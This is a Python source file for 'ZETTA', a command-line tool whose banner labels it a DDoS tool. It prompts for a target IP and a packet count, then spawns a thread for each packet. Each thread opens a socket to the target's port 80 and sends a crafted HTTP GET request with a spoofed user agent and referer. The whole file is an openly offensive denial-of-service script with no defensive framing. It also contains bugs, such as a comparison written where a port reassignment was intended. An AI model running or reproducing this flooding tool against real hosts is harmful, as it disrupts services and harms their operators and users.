# ZETTA
# v0.0.3
import os

try:
    import fade
    import socket
    import threading
    from colorama import Fore as F

except ModuleNotFoundError:
    os.system('python -m pip install fade colorama')


class Zetta:
    def __init__(self, ip: str):
        self.count = 0
        self.ip = ip
        self.agent = f"User-Agent: Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1", "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1\r\n"
        self.accept = "Accept-Encoding: gzip, deflate"
        self.reffer = f"Referer: https://duckduckgo.com/?q= {self.ip}\r\n"
        self.content = "Content-Type: application/x-www-form-urlencoded\r\n"
        self.length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
        self.target_host = f"GET / HTTP/1.1\r\nHost: {self.ip}:80\r\n"
        self.main_req = f"{self.target_host} {self.agent} {self.accept} {self.reffer} {self.content} {self.length}\r\n"
        self.port = 80

    def send(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.ip, self.port))
            s.send(str.encode(self.main_req))
            self.count += 1
            print(f"{F.GREEN}[+]{F.RESET} Sent packet {self.count}")

        except Exception as e:
            if self.port == 80:
                self.port == 443
                self.target_host = f"GET / HTTP/1.1\r\nHost: {self.ip}:{self.port}\r\n"

            print(f"{F.RED}[-]{F.RESET} Didn't send packet. Error: {e}")

def banner():
    print(fade.greenblue("""
╔════╗╔═══╗╔════╗╔════╗╔═══╗
╚══╗ ║║╔══╝║╔╗╔╗║║╔╗╔╗║║╔═╗║
  ╔╝╔╝║╚══╗╚╝║║╚╝╚╝║║╚╝║║ ║║
 ╔╝╔╝ ║╔══╝  ║║    ║║  ║╚═╝║
╔╝ ╚═╗║╚══╗ ╔╝╚╗  ╔╝╚╗ ║╔═╗║
╚════╝╚═══╝ ╚══╝  ╚══╝ ╚╝ ╚╝
---------| DDoS |-----------\n"""))

def main():
    banner()
    ip = str(input(f"{F.YELLOW}[?]{F.RESET} Target: "))
    pack = int(input(f"{F.YELLOW}[?]{F.RESET} Packet/s: "))
    zetta = Zetta(ip)

    threads = []
    for _ in range(pack):
        t = threading.Thread(target=zetta.send)
        threads.append(t)
        t.start()
    
    for thr in threads:
        thr.join()
    
    done = input(f"{F.YELLOW}[?]{F.RESET} Finished sending {F.LIGHTBLUE_EX}{pack}{F.RESET} packets. Restart?: ")
    if done.lower() in ["y", "yes", "ye"]:
        os.system("cls" if os.name == "nt" else "clear")
        main()
    else:
        exit()

    

if __name__ == "__main__":
    main()
